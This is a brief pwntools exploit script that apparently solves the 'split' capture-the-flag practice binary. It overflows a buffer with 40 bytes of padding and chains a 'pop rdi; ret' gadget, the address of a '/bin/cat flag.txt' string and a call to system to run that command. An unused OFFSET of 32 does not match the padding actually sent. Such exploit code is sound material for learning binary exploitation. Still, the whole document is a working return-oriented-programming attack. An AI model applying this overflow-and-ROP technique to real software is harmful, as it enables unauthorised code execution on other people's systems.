#!/usr/bin/python
from pwn import *
OFFSET = 32
if __name__ == "__main__":
    payload = ""
    payload += "A" * 40
    payload += p64(0x00400883)  # pop rdi; ret;
    payload += p64(0x00601060)  # /bin/cat flag.txt
    payload += p64(0x00400810)  # call system@plt

    io = process("./split")
    io.sendline(payload)
    print io.recvall()
